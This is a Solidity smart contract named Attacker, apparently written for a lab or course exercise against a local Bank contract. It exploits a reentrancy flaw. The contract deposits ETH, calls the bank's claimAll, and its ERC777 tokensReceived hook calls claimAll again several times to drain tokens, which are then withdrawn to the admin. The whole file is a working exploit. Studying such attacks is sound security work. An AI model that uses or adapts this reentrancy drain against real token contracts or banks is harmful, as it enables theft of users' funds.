// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/token/ERC777/ERC777.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";

import "./Bank.sol";

contract Attacker is AccessControl, IERC777Recipient {
    bytes32 public constant ATTACKER_ROLE = keccak256("ATTACKER_ROLE");

    IERC1820Registry private _erc1820 = IERC1820Registry(
        0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24
    );

    bytes32 private constant TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");

    uint8 private depth = 0;
    uint8 public max_depth = 2;

    Bank public bank;

    event Deposit(uint256 amount);
    event Recurse(uint8 depth);

    constructor(address admin) {
        _grantRole(DEFAULT_ADMIN_ROLE, admin);
        _grantRole(ATTACKER_ROLE, admin);

        // Register as ERC777 recipient
        _erc1820.setInterfaceImplementer(
            address(this),
            TOKENS_RECIPIENT_INTERFACE_HASH,
            address(this)
        );
    }

    function setTarget(address bank_address) external onlyRole(ATTACKER_ROLE) {
        require(bank_address != address(0), "Invalid bank");
        bank = Bank(bank_address);

        _grantRole(ATTACKER_ROLE, address(this));
        _grantRole(ATTACKER_ROLE, address(bank.token()));
    }

    function attack(uint256 amt) external payable onlyRole(ATTACKER_ROLE) {
        require(address(bank) != address(0), "Bank not set");
        require(msg.value == amt, "Incorrect ETH sent");

        bank.deposit{value: amt}();
        emit Deposit(amt);

        bank.claimAll();
    }

    function withdraw(address recipient) external onlyRole(ATTACKER_ROLE) {
        ERC777 token = bank.token();
        uint256 bal = token.balanceOf(address(this));
        require(bal > 0, "Cannot withdraw 0");

        uint256 size;
        assembly {
            size := extcodesize(recipient)
        }

        // Only allow sending to EOA or self contract
        if (size != 0 && recipient != address(this)) {
            revert("Recipient is a contract without ERC777TokensRecipient");
        }

        token.send(recipient, bal, "");
    }

    function tokensReceived(
        address /*operator*/,
        address /*from*/,
        address /*to*/,
        uint256 /*amount*/,
        bytes calldata /*userData*/,
        bytes calldata /*operatorData*/
    ) external override {
        require(msg.sender == address(bank.token()), "Not MCITR token");

        if (depth < max_depth) {
            depth += 1;
            emit Recurse(depth);

            bank.claimAll();

            depth -= 1;
        }
    }

    receive() external payable {}
}
